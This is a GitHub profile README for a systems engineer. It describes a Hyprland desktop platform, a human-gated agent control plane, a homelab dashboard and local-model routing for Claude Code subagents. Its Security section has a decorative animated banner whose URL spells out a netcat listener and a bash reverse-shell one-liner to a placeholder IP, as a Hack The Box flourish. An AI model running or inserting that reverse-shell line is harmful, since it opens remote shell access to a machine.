<h1 align="center">T-CRYPT <sub><sup>// SYSTEMS LAB</sup></sub></h1>

<p align="center">
  <b>Senior Systems Engineer</b> · MSP delivery · 10 years in IT, started in the USAF · Colorado
  <br>
  <sub>Linux desktop systems · infrastructure visibility · human-gated AI development · local agent compute</sub>
</p>

<p align="center">
  <img src="https://readme-typing-svg.demolab.com?font=Fira+Code&pause=1200&color=29E8F7&center=true&vCenter=true&width=620&height=30&lines=build+%E2%86%92+operate+%E2%86%92+compute;the+human+keeps+the+approval+gate;inference+runs+on+my+own+hardware" alt="build → operate → compute" />
</p>

I spend my days designing and delivering infrastructure for 80+ client environments. Off the clock I build the systems I want to run on: a desktop that understands the machine under it, a control plane that keeps AI agents on a leash, a live view of my lab, and an agent stack that runs on my own GPU.

These aren't four side projects. They're four layers of one environment.

---

## System map

```text
                               ┌──────────────────────────┐
                               │   T-CRYPT // SYSTEMS LAB │
                               └────────────┬─────────────┘
          ┌─────────────────────────────────┼─────────────────────────────────┐
          │ BUILD                           │ OPERATE                         │ BUILD
┌─────────┴──────────┐           ┌──────────┴──────────┐           ┌──────────┴─────────┐
│    APHOTIC-HYPR    │           │       AETHER        │           │        GATE        │
│  desktop platform  │           │  live lab surface   │           │  human-gated agent │
│  Quickshell · QML  │           │  4× Proxmox · ~50   │           │   control plane    │
│  Resource Engine   │           │  services · events  │           │   (early build)    │
└─────────┬──────────┘           └──────────┬──────────┘           └──────────┬─────────┘
          │ claims VRAM from                │ streams model loads,            │ drives
          │ loaded llama-swap models        │ tickets, commits, evals         │ Claude Code
          └───────────────────────┐         │         ┌───────────────────────┘
                                  ▼         ▼         ▼
                        ┌──────────────────────────────────────┐
                        │   COMPUTE  //  CLAUDE-LOCAL          │
                        ├──────────────────────────────────────┤
                        │   Claude Code    harness · subagents │
                        │   claude-router  local/cloud split   │
                        │   llama-swap     roles · lifecycle   │
                        │   llama.cpp      inference runtime   │
                        │   RTX 4090       24GB VRAM           │
                        └──────────────────────────────────────┘
```

| Layer | System | Status | What it is |
| :-- | :-- | :-- | :-- |
| **BUILD** | [APHOTIC-HYPR](#aphotic-hypr) | `public · beta` | Arch / Hyprland / Quickshell desktop platform with resource arbitration |
| **BUILD** | [GATE](#gate) | `public · early` | Localhost control plane: agents plan and execute, humans approve |
| **OPERATE** | [AETHER](#aether) | `private · live lab` | Visual, agent-readable surface for the homelab |
| **COMPUTE** | [CLAUDE-LOCAL](#claude-local) | `local architecture` | Claude Code subagents running on local models on my RTX 4090 |

---

## BUILD

### APHOTIC-HYPR

<p>
  <a href="https://github.com/T-Crypt/Aphotic-Hypr"><img src="https://img.shields.io/badge/repo-T--Crypt%2FAphotic--Hypr-7DCFFF?style=flat-square&logo=github&labelColor=0b0d12" alt="repo" /></a>
  <a href="https://t-crypt.github.io/aphotic-hypr"><img src="https://img.shields.io/badge/docs-t--crypt.github.io%2Faphotic--hypr-AD8EE6?style=flat-square&labelColor=0b0d12" alt="docs" /></a>
  <img src="https://img.shields.io/badge/status-beta-E0AF68?style=flat-square&labelColor=0b0d12" alt="beta" />
  <img src="https://img.shields.io/badge/Hyprland-58E1FF?style=flat-square&logo=wayland&logoColor=black" alt="Hyprland" />
  <img src="https://img.shields.io/badge/Quickshell_%2F_QML-41CD52?style=flat-square&logo=qt&logoColor=white" alt="Quickshell" />
</p>

A modular Hyprland environment where one Quickshell shell (300+ QML files) owns the whole desktop UI. It's the environment I run daily on the Arch side of my workstation, and it's built around one rule: **features you aren't using shouldn't consume resources.**

```text
APHOTIC
├── Quickshell shell ─── bar (5 styles) · notch · launcher · notifications · OSD
│                        lock · Command Center · settings · theme creator
├── Services ─────────── system / process / GPU VRAM usage · Hyprland IPC
│                        audio · network · weather · plugin registry
├── Resource Engine ──── claim → contention → negotiation → apply → restore
├── Profiles ─────────── base (minimal|full) + Developer · Gaming · AI · Security
└── Plugins ──────────── everything outside the base shell, AI included
```

- **Resource Engine.** Workloads declare claims on finite resources (VRAM first). When a gaming claim contends with a loaded local model, the shell offers the negotiation (`Suspend` / `Keep Running` / `Ignore`) instead of deciding for you. It never kills processes, never touches the kernel or `sysctl`, and stays dormant until something claims a resource. Ollama, llama-swap, and GameMode claimants ship today.
- **GPU-aware AI.** The llama-swap claimant maps each loaded model to the `llama-server` process serving it, reads measured VRAM from `nvidia-smi`, and unloads through llama-swap's API on Suspend. A separate service samples live tokens/sec and context use.
- **Agent visibility.** Tracks running Claude Code / Codex / OpenCode / Gemini CLI sessions, separates *harnesses* (run sessions, execute tools) from *providers* (serve inference only), and renders tool calls live in the Agent Graph plugin.
- **Theming pipeline.** Eight shipped themes plus wallpaper-driven color generation, applied live across the shell, GTK3, and GTK4/libadwaita without a relog.
- **Plugins.** Manifest-based, installable and removable on a running desktop; a plugin can claim the full-screen Workspace plane. Separate repos for [plugins](https://github.com/T-Crypt/aphotic-plugins), [themes](https://github.com/T-Crypt/aphotic-themes), and [pets](https://github.com/T-Crypt/aphotic-pets).
- **System tooling.** `aphotic` CLI, `--dry-run`-first installer with layered package resolution, doctor checks, backups on uninstall. Installer changes run through a Proxmox VM before they ship.

<sub>→ <a href="https://t-crypt.github.io/aphotic-hypr/docs/architecture/">Architecture</a> · <a href="https://t-crypt.github.io/aphotic-hypr/docs/resource-engine/">Resource Engine</a> · <a href="https://t-crypt.github.io/aphotic-hypr/docs/plugin-system/">Plugin System</a> · <a href="https://t-crypt.github.io/aphotic-hypr/docs/theming/">Theming</a></sub>

### GATE

<p>
  <a href="https://github.com/T-Crypt/GATE"><img src="https://img.shields.io/badge/repo-T--Crypt%2FGATE-7DCFFF?style=flat-square&logo=github&labelColor=0b0d12" alt="repo" /></a>
  <a href="https://t-crypt.github.io/GATE"><img src="https://img.shields.io/badge/docs-t--crypt.github.io%2FGATE-AD8EE6?style=flat-square&labelColor=0b0d12" alt="docs" /></a>
  <img src="https://img.shields.io/badge/status-early-E0AF68?style=flat-square&labelColor=0b0d12" alt="early" />
  <img src="https://img.shields.io/badge/Node.js-339933?style=flat-square&logo=nodedotjs&logoColor=white" alt="Node.js" />
  <img src="https://img.shields.io/badge/SQLite-07405E?style=flat-square&logo=sqlite&logoColor=white" alt="SQLite" />
</p>

**AI can plan and execute. The human keeps authority over every transition that matters.** GATE is a localhost control plane built on that rule. The name is literal: the core object is the *gate*, a checkpoint a step has to clear before the timeline lets it proceed. Agents can attach evidence to a gate; only a human can decide it.

```text
goal ─► agent drafts plan ─► [HUMAN accepts] ─► step runs in its own worktree
                                                       │
                              agent submits evidence ◄─┘
                                       │
                                [HUMAN decides gate] ─► next step unlocks
```

The shape is in place (proposed timelines, per-run worktrees, human-only approval, protected branches that are never touched, persistent project state) and the rest is still being built. It's early, and it's the direction I care most about for agentic development: autonomy inside explicit, reviewable boundaries.

---

## OPERATE

### AETHER

<p>
  <img src="https://img.shields.io/badge/LAB-LIVE_SYSTEM-29E8F7?style=flat-square&labelColor=0b0d12" alt="live system" />
  <img src="https://img.shields.io/badge/source-private-555555?style=flat-square&labelColor=0b0d12" alt="private" />
  <img src="https://img.shields.io/badge/Proxmox_VE-E57000?style=flat-square&logo=proxmox&logoColor=white" alt="Proxmox" />
  <img src="https://img.shields.io/badge/Cloudflare-F38020?style=flat-square&logo=cloudflare&logoColor=white" alt="Cloudflare" />
</p>

> Not a repository. AETHER is the live interface to my homelab.

```text
┌─ AETHER // NODE ──────────────────────────────────────────────── LIVE ─┐
│                                                                        │
│  LAB (private)                      EDGE (public)                      │
│  ├── 4× Proxmox VE nodes            ├── glass-cockpit view  ◄── people │
│  ├── ~50 services                   └── /api/v1 · llms.txt  ◄── agents │
│  ├── RTX 4090 · local models                   ▲                       │
│  └── agents · tickets · evals                  │                       │
│            │                                   │                       │
│            └──► redaction gate ──► outbound-only publisher ──► relay   │
│                                                                        │
│  model loads · ticket moves · commits · eval rounds                    │
└────────────────────────────────────────────────────────────────────────┘
```

Most homelab dashboards answer "what's running" for the owner on the LAN. AETHER shows the lab working, as it happens: models loading, agents moving tickets, commits landing, eval rounds deciding which local model earns which role. It's built for two audiences. People get a visual control surface; other people's agents get a machine-readable API and `llms.txt` so they can pull the same state and recipes.

The security boundary is the design constraint, not an afterthought. Nothing connects inbound to the lab, events are redaction-gated at the source before they leave, and the public edge only ever sees what an outbound-only publisher sends it.

Underneath it is an agent-operated lab: four standalone Proxmox VE nodes, Prometheus / Grafana / Uptime Kuma monitoring, CrowdSec, Security Onion, Proxmox Backup Server, and an operations repo that local and cloud agents work from directly.

<sub>Source is private and not published.</sub>

---

## COMPUTE

### CLAUDE-LOCAL

<p>
  <img src="https://img.shields.io/badge/local_architecture-no_public_repo-555555?style=flat-square&labelColor=0b0d12" alt="architecture" />
  <img src="https://img.shields.io/badge/Claude_Code-D97757?style=flat-square&logo=anthropic&logoColor=white" alt="Claude Code" />
  <img src="https://img.shields.io/badge/llama--swap-1A1A2E?style=flat-square" alt="llama-swap" />
  <img src="https://img.shields.io/badge/llama.cpp-0b0d12?style=flat-square" alt="llama.cpp" />
  <img src="https://img.shields.io/badge/RTX_4090-76B900?style=flat-square&logo=nvidia&logoColor=white" alt="RTX 4090" />
</p>

Running a local LLM isn't the interesting part. The interesting part is that my local models run **inside Claude Code's native Agent workflow**. Claude Code launches them as ordinary subagents, each in its own agent session, and the model doing the work is on my GPU.

```text
LOCAL AGENT FABRIC

Claude Code (main session, cloud model)
    │  ANTHROPIC_BASE_URL
    ▼
claude-router (loopback) ─── non-local model ──────────────► Anthropic API (passthrough)
    │ local role
    ├── agent 01 ──┐
    ├── agent 02 ──┼──► llama-swap ──► llama-server (llama.cpp) ──► RTX 4090 · 24GB
    └── agent 03 ──┘    role → model     --parallel 1                one gen slot
```

| | |
| :-- | :-- |
| `execution` | local |
| `orchestrator` | Claude Code |
| `split` | claude-router: local roles → llama-swap, everything else → Anthropic unchanged |
| `router` | llama-swap |
| `runtime` | llama.cpp / llama-server |
| `interface` | OpenAI-compatible HTTP |
| `accelerator` | RTX 4090 · 24GB |
| `roles` | `agent` · `agent-fast` · `coder` · `coder-fast` · `review` · `fast` · `thinker` |
| `agents` | ~3 concurrent streams, independently steerable |

Each role is a Claude Code subagent definition with its own tool set (`Read`, `Grep`, `Edit`, `Bash`, ...) and guardrails. A local subagent gets its own conversation loop, its own task and context lane, and real tool access: read files, run commands, run builds, do the development work. I can drop into any of those conversations and steer it directly, the same as a normal Claude Code subagent. The router strips auth from local calls, never logs cloud traffic, and has a one-variable kill switch: unset `ANTHROPIC_BASE_URL` and Claude Code goes straight to Anthropic again.

<details>
<summary><b>How three agents share one generation slot</b></summary>
<br>

`llama-server` runs with `--parallel 1`, so the loaded model has **one** generation slot. Three agents run concurrently at the *workflow* layer, not as three simultaneous GPU generations:

```text
AGENT A ── reasoning ── tool call ───────── inference ── tool call
AGENT B ───── inference ── filesystem ───────────── inference
AGENT C ───────── tools ───── waiting ── inference ─────────────
            ▲ inference requests queue for the one slot; tool work overlaps
```

Agent work is mostly not token generation. While one agent holds the GPU, the others are reading files, running builds, or parsing output. The pipeline stays busy without claiming parallel generation it doesn't have.

</details>

<details>
<summary><b>Model routing and swap cost</b></summary>
<br>

llama-swap owns the model lifecycle. Agents ask for a **role**, not a model id, so a quant can change underneath without touching any harness config.

```text
group "chat"        swap · exclusive     one chat model resident at a time
group "embeddings"  persistent           small embed model stays loaded alongside
```

- Agents on the **same** role share the loaded runtime. No swap.
- Agents on **different** chat models force an unload/load of a ~20GB model, and that latency dominates.
- So parallel agents get assigned to the same role on purpose when the work allows it. Role assignment is a scheduling decision.
- The embed model is pinned so a code-search call never evicts the chat model mid-session.

The config is managed as code: validated in the repo, checked for drift against the live file and the running server, promoted only when the GPU is idle, and pushed out to the other harnesses (OpenCode, Pi, DSH) that consume the same roles. One config serves both boots of the workstation.

</details>

<details>
<summary><b>Next: batched generation (experimental, not deployed)</b></summary>
<br>

`llama-server --parallel 2` gives the model two slots and true batched concurrent generation. It's queued as an A/B test on the MoE `agent` / `fast` roles, with a unified KV cache splitting the context budget. The tradeoffs being measured:

- aggregate throughput vs per-stream speed
- context window split across slots
- VRAM headroom on a 24GB card
- gains that depend heavily on the workload mix

It ships only if aggregate throughput clearly improves inside the VRAM budget. Current config is `--parallel 1`.

</details>

---

## Inference stack

<p>
  <img alt="Claude Code" src="https://img.shields.io/badge/Claude_Code-D97757?style=for-the-badge&logo=anthropic&logoColor=white" />
  <img alt="llama.cpp" src="https://img.shields.io/badge/llama.cpp-0b0d12?style=for-the-badge" />
  <img alt="llama-swap" src="https://img.shields.io/badge/llama--swap-1A1A2E?style=for-the-badge" />
  <img alt="Ollama" src="https://img.shields.io/badge/Ollama-000000?style=for-the-badge&logo=ollama&logoColor=white" />
  <img alt="LM Studio" src="https://img.shields.io/badge/LM_Studio-6E56CF?style=for-the-badge" />
  <img alt="Unsloth" src="https://img.shields.io/badge/Unsloth-1A1A2E?style=for-the-badge" />
  <img alt="PyTorch" src="https://img.shields.io/badge/PyTorch-EE4C2C?style=for-the-badge&logo=pytorch&logoColor=white" />
  <img alt="CUDA" src="https://img.shields.io/badge/CUDA-76B900?style=for-the-badge&logo=nvidia&logoColor=white" />
  <img alt="Jupyter" src="https://img.shields.io/badge/Jupyter-F37626?style=for-the-badge&logo=jupyter&logoColor=white" />
</p>

| Layer | Tool | Role |
| :-- | :-- | :-- |
| Orchestration | Claude Code | agent harness, subagents, tool execution |
| Local/cloud split | claude-router | local roles to llama-swap, cloud traffic passed through |
| Routing | llama-swap | role aliases, swap groups, load/unload lifecycle |
| Runtime | llama.cpp / llama-server | GGUF inference, pinned builds, slot / context / reasoning-budget config |
| Serving (alt) | Ollama · LM Studio | quick model management, desktop serving |
| Training | Unsloth · PyTorch | fine-tuning experiments |
| Compute | RTX 4090 · CUDA | 24GB VRAM |

**Working knowledge:** GGUF and quantized inference (IQ / Q4 quants, MoE vs dense tradeoffs) · local model serving · GPU inference and VRAM budgeting · model routing · inference runtime configuration (slots, context, parallelism) · context management · agent orchestration · multi-agent workflows · local coding agents · local/cloud model interoperability over OpenAI-compatible APIs · task-level evals that pick which model earns which role

---

## Workstation

```text
WORKSTATION ─────────────────────────────────────────────────────
CPU       Intel Core i9-14900K
GPU       NVIDIA RTX 4090 · 24GB
RAM       64GB
COOLING   custom water loop

BOOT
├── Arch Linux
│   └── Aphotic-Hypr     daily driver · Aphotic dev · Claude-Local host
└── Windows 11           when the job needs it · same llama-swap stack

ROLES     development · local LLM inference · GPU compute · security lab
```

---

## Security

<p align="center">
  <a href="https://app.hackthebox.com/profile/204903"><img src="https://www.hackthebox.com/badge/image/204903" alt="Hack The Box" /></a>
</p>

<p align="center">
  <img src="https://readme-typing-svg.demolab.com?font=Fira+Code&duration=4000&pause=500&color=29E8F7&multiline=true&width=500&height=255&lines=nc+-lvnp+4444;listening+on+%5Bany%5D+4444+...;connect+to+%5BT-Crypt%5D++profile+;bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.10.10.10%2F4444+0%3E%261;T-Crypt%40profile%3A~%24+.%2Fexploit.py;......................................................................................................;...................PwN3d!......................................;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++;%24whoami;T-Crypt" alt="reverse shell" />
</p>

Hack The Box as `5H3LLKiller`. Kali and BlackArch tooling, plus Aphotic's Security profile for offensive-research sublayers. **Hack → Scream → Repeat.**

---

## Infrastructure & enterprise

<details>
<summary><b>MSP / enterprise stack</b></summary>
<p>
  <img alt="Microsoft 365" src="https://img.shields.io/badge/Microsoft_365-D83B01?style=for-the-badge&logo=microsoft365&logoColor=white" />
  <img alt="Entra ID" src="https://img.shields.io/badge/Entra_ID-0078D4?style=for-the-badge&logo=microsoftazure&logoColor=white" />
  <img alt="JumpCloud" src="https://img.shields.io/badge/JumpCloud-F74F3F?style=for-the-badge&logo=jumpcloud&logoColor=white" />
  <img alt="Cisco Meraki" src="https://img.shields.io/badge/Cisco_Meraki-67B346?style=for-the-badge&logo=ciscomeraki&logoColor=white" />
  <img alt="Palo Alto Networks" src="https://img.shields.io/badge/Palo_Alto_Networks-FA582D?style=for-the-badge&logo=paloaltosoftware&logoColor=white" />
  <img alt="Datto RMM" src="https://img.shields.io/badge/Datto_RMM-01A6E4?style=for-the-badge" />
  <img alt="LogicMonitor" src="https://img.shields.io/badge/LogicMonitor-1F1F1F?style=for-the-badge" />
  <img alt="IT Glue" src="https://img.shields.io/badge/IT_Glue-0072CE?style=for-the-badge" />
</p>
</details>

<details>
<summary><b>Virtualization, homelab & self-hosting</b></summary>
<p>
  <img alt="Proxmox" src="https://img.shields.io/badge/Proxmox-E57000?style=for-the-badge&logo=proxmox&logoColor=white" />
  <img alt="vCenter" src="https://img.shields.io/badge/vCenter-717074?style=for-the-badge&logo=vmware&logoColor=white" />
  <img alt="Docker" src="https://img.shields.io/badge/Docker-2496ED?style=for-the-badge&logo=docker&logoColor=white" />
  <img alt="TrueNAS" src="https://img.shields.io/badge/TrueNAS-0095D5?style=for-the-badge&logo=truenas&logoColor=white" />
  <img alt="Jellyfin" src="https://img.shields.io/badge/Jellyfin-00A4DC?style=for-the-badge&logo=jellyfin&logoColor=white" />
  <img alt="Pi-hole" src="https://img.shields.io/badge/Pi--hole-96060C?style=for-the-badge&logo=pi-hole&logoColor=white" />
  <img alt="Nginx Proxy Manager" src="https://img.shields.io/badge/Nginx_Proxy_Manager-269639?style=for-the-badge&logo=nginxproxymanager&logoColor=white" />
  <img alt="Tailscale" src="https://img.shields.io/badge/Tailscale-000000?style=for-the-badge&logo=tailscale&logoColor=white" />
  <img alt="Grafana" src="https://img.shields.io/badge/Grafana-F46800?style=for-the-badge&logo=grafana&logoColor=white" />
  <img alt="Prometheus" src="https://img.shields.io/badge/Prometheus-E6522C?style=for-the-badge&logo=prometheus&logoColor=white" />
</p>
</details>

<details>
<summary><b>Operating systems & desktop</b></summary>
<p>
  <img alt="Arch Linux" src="https://img.shields.io/badge/Arch_Linux-1793D1?style=for-the-badge&logo=arch-linux&logoColor=white" />
  <img alt="Debian" src="https://img.shields.io/badge/Debian-A81D33?style=for-the-badge&logo=debian&logoColor=white" />
  <img alt="Windows" src="https://img.shields.io/badge/Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white" />
  <img alt="Kali Linux" src="https://img.shields.io/badge/Kali_Linux-557C94?style=for-the-badge&logo=kalilinux&logoColor=white" />
  <img alt="Red Hat" src="https://img.shields.io/badge/Red_Hat-EE0000?style=for-the-badge&logo=redhat&logoColor=white" />
  <img alt="CentOS" src="https://img.shields.io/badge/CentOS-262577?style=for-the-badge&logo=centos&logoColor=white" />
  <img alt="NixOS" src="https://img.shields.io/badge/NixOS-5277C3?style=for-the-badge&logo=nixos&logoColor=white" />
  <img alt="macOS" src="https://img.shields.io/badge/macOS-000000?style=for-the-badge&logo=apple&logoColor=white" />
  <img alt="Hyprland" src="https://img.shields.io/badge/Hyprland-58E1FF?style=for-the-badge&logo=wayland&logoColor=black" />
  <img alt="Quickshell" src="https://img.shields.io/badge/Quickshell-41CD52?style=for-the-badge&logo=qt&logoColor=white" />
  <img alt="Neovim" src="https://img.shields.io/badge/NeoVim-57A143?style=for-the-badge&logo=neovim&logoColor=white" />
</p>
</details>

<details>
<summary><b>Languages & scripting</b></summary>
<p>
  <img alt="Python" src="https://img.shields.io/badge/Python-14354C?style=for-the-badge&logo=python&logoColor=white" />
  <img alt="PowerShell" src="https://img.shields.io/badge/PowerShell-5391FE?style=for-the-badge&logo=powershell&logoColor=white" />
  <img alt="Bash" src="https://img.shields.io/badge/Bash-121011?style=for-the-badge&logo=gnu-bash&logoColor=white" />
  <img alt="QML" src="https://img.shields.io/badge/QML-41CD52?style=for-the-badge&logo=qt&logoColor=white" />
  <img alt="JavaScript" src="https://img.shields.io/badge/JavaScript-F7DF1E?style=for-the-badge&logo=javascript&logoColor=black" />
  <img alt="SQL" src="https://img.shields.io/badge/SQL-025E8C?style=for-the-badge&logo=databricks&logoColor=white" />
  <img alt="PHP" src="https://img.shields.io/badge/PHP-777BB4?style=for-the-badge&logo=php&logoColor=white" />
  <img alt="Ruby" src="https://img.shields.io/badge/Ruby-CC342D?style=for-the-badge&logo=ruby&logoColor=white" />
  <img alt="HTML" src="https://img.shields.io/badge/HTML-E34F26?style=for-the-badge&logo=html5&logoColor=white" />
  <img alt="Markdown" src="https://img.shields.io/badge/Markdown-000000?style=for-the-badge&logo=markdown&logoColor=white" />
  <img alt="Google Apps Script" src="https://img.shields.io/badge/Google_Apps_Script-4285F4?style=for-the-badge&logo=google&logoColor=white" />
</p>
</details>

<details>
<summary><b>Databases & hosting</b></summary>
<p>
  <img alt="SQLite" src="https://img.shields.io/badge/SQLite-07405E?style=for-the-badge&logo=sqlite&logoColor=white" />
  <img alt="MySQL" src="https://img.shields.io/badge/MySQL-4479A1?style=for-the-badge&logo=mysql&logoColor=white" />
  <img alt="MongoDB" src="https://img.shields.io/badge/MongoDB-4EA94B?style=for-the-badge&logo=mongodb&logoColor=white" />
  <img alt="InfluxDB" src="https://img.shields.io/badge/InfluxDB-22ADF6?style=for-the-badge&logo=influxdb&logoColor=white" />
  <img alt="Neo4j" src="https://img.shields.io/badge/Neo4j-008CC1?style=for-the-badge&logo=neo4j&logoColor=white" />
  <img alt="Oracle" src="https://img.shields.io/badge/Oracle-F80000?style=for-the-badge&logo=oracle&logoColor=white" />
  <img alt="Elasticsearch" src="https://img.shields.io/badge/Elasticsearch-005571?style=for-the-badge&logo=elasticsearch&logoColor=white" />
  <img alt="GitHub Pages" src="https://img.shields.io/badge/GitHub_Pages-327FC7?style=for-the-badge&logo=github&logoColor=white" />
  <img alt="Vercel" src="https://img.shields.io/badge/Vercel-000000?style=for-the-badge&logo=vercel&logoColor=white" />
  <img alt="Heroku" src="https://img.shields.io/badge/Heroku-430098?style=for-the-badge&logo=heroku&logoColor=white" />
</p>
</details>

<details>
<summary><b>Tools</b></summary>
<p>
  <img alt="Git" src="https://img.shields.io/badge/Git-F05032?style=for-the-badge&logo=git&logoColor=white" />
  <img alt="Visual Studio Code" src="https://img.shields.io/badge/VS_Code-0078D7?style=for-the-badge&logo=visualstudiocode&logoColor=white" />
  <img alt="DBeaver" src="https://img.shields.io/badge/DBeaver-372923?style=for-the-badge&logo=dbeaver&logoColor=white" />
  <img alt="Bitwarden" src="https://img.shields.io/badge/Bitwarden-175DDC?style=for-the-badge&logo=bitwarden&logoColor=white" />
  <img alt="Notion" src="https://img.shields.io/badge/Notion-000000?style=for-the-badge&logo=notion&logoColor=white" />
  <img alt="OBS Studio" src="https://img.shields.io/badge/OBS_Studio-302E31?style=for-the-badge&logo=obsstudio&logoColor=white" />
  <img alt="Inkscape" src="https://img.shields.io/badge/Inkscape-000000?style=for-the-badge&logo=inkscape&logoColor=white" />
  <img alt="Adobe" src="https://img.shields.io/badge/Adobe-FF0000?style=for-the-badge&logo=adobe&logoColor=white" />
  <img alt="Audacity" src="https://img.shields.io/badge/Audacity-0000CC?style=for-the-badge&logo=audacity&logoColor=white" />
  <img alt="Construct 3" src="https://img.shields.io/badge/Construct_3-00B56A?style=for-the-badge&logo=construct3&logoColor=white" />
</p>
</details>

---

<div align="center">

<a href="http://www.github.com/T-Crypt"><img alt="GitHub streak" src="https://streak-stats.demolab.com/?user=T-Crypt&show_icons=true&count_private=true&theme=react&hide_border=true&title_color=0891b2&text_color=ffffff&icon_color=0891b2&bg_color=0D1117" width="100%" /></a>

<a href="https://linkedin.com/in/trevin-tindall-483883213" target="blank"><img src="https://raw.githubusercontent.com/rahuldkjain/github-profile-readme-generator/master/src/images/icons/Social/linked-in-alt.svg" alt="LinkedIn" height="30" width="40" /></a>
<a href="https://app.hackthebox.com/profile/204903" target="blank"><img src="https://github.com/T-Crypt/hackthebox/blob/main/hack-the-box-svgrepo-com.svg" alt="Hack The Box" height="30" width="40" /></a>
<a href="https://www.hackerrank.com/trevintindall" target="blank"><img src="https://raw.githubusercontent.com/rahuldkjain/github-profile-readme-generator/master/src/images/icons/Social/hackerrank.svg" alt="HackerRank" height="30" width="40" /></a>

<sub>Ask me about Linux, Proxmox, MSP infrastructure, HTB, or local inference. Help building out Aphotic-Hypr is always welcome.</sub>

</div>

<details>
<summary><b>Holopin / Hacktoberfest</b></summary>
<p><a href="https://holopin.io/@tcrypt"><img src="https://holopin.me/tcrypt" alt="@tcrypt's Holopin board"></a></p>
</details>

<details>
<summary><b>Fun fact of the day</b></summary>
<img src="https://readme-jokes.vercel.app/api?theme=default" width="100%"/>
</details>

<p>
  <a href="https://ko-fi.com/tcrypt"><img src="https://cdn.ko-fi.com/cdn/kofi3.png?v=3" height="40" alt="Support on Ko-fi" /></a>
  <img src="https://komarev.com/ghpvc/?username=t-crypt&label=profile%20views&color=0e75b6&style=flat" alt="profile views" />
</p>
